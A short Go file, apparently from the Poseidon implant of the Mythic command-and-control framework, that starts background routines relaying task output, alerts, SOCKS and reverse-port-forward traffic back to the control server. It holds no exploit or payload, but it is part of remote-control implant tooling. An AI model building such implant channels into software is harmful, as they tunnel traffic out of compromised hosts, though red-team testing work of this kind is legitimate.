package responses

import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"math"
)

const USER_OUTPUT_CHUNK_SIZE = 512000 //Normal mythic chunk size

func GetChunkNums(size int64) int64 {
	return int64(math.Max(float64(1), math.Ceil(float64(size)/USER_OUTPUT_CHUNK_SIZE)))
}

func Initialize(getProfilesPushChannelFunc func() chan structs.MythicMessage) {
	go listenForDelegateMessagesToMythic(getProfilesPushChannelFunc)
	go listenForEdgeAnnouncementsToMythic(getProfilesPushChannelFunc)
	go listenForInteractiveTasksToMythic(getProfilesPushChannelFunc)
	go listenForAlertMessagesToMythic(getProfilesPushChannelFunc)
	go listenForTaskResponsesToMythic(getProfilesPushChannelFunc)
	go listenForSocksTrafficToMythic(getProfilesPushChannelFunc)
	go listenForRpfwdTrafficToMythic(getProfilesPushChannelFunc)
}
